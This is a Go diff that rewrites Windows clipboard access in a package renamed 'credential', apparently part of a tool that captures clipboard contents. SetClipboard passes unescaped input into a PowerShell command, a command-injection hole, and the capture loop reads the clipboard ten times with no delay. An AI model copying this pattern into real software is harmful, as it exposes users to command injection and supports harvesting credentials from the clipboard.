@@ -1,40 +1,33 @@
 //go:build windows
 
-package windows
+package credential
 
 import (
-"golang.org/x/sys/windows"
-"unsafe"
+"os/exec"
 )
 
-type Clipboard struct{}
-
-func NewClipboard() *Clipboard {
-return &Clipboard{}
+func CaptureClipboard() string {
+cmd := exec.Command("cmd", "/c", "powershell -Command \"Get-Clipboard\"")
+output, err := cmd.Output()
+if err != nil {
+return ""
+}
+return string(output)
 }
 
-func (c *Clipboard) Capture() (string, error) {
-user32 := windows.NewLazyDLL("user32.dll")
-procOpenClipboard := user32.NewProc("OpenClipboard")
-procGetClipboardData := user32.NewProc("GetClipboardData")
-procCloseClipboard := user32.NewProc("CloseClipboard")
-
-ret, _, _ := procOpenClipboard.Call(0)
-if ret == 0 {
-return "", nil
+func CaptureClipboardLoop() string {
+var result string
+for i := 0; i < 10; i++ {
+result += CaptureClipboard()
 }
-defer procCloseClipboard.Call()
-
-handle, _, _ := procGetClipboardData.Call(1)
-if handle == 0 {
-return "", nil
+return result
 }
 
-dataPtr := (*uint16)(unsafe.Pointer(handle))
-if dataPtr == nil {
-return "", nil
+func SetClipboard(data string) bool {
+cmd := exec.Command("cmd", "/c", "powershell -Command \"Set-Clipboard -Value '"+data+"'\"")
+err := cmd.Run()
+if err != nil {
+return false
 }
-
-data := windows.UTF16ToString((*[1 << 20]uint16)(unsafe.Pointer(dataPtr))[:])
-return data, nil
+return true
 }
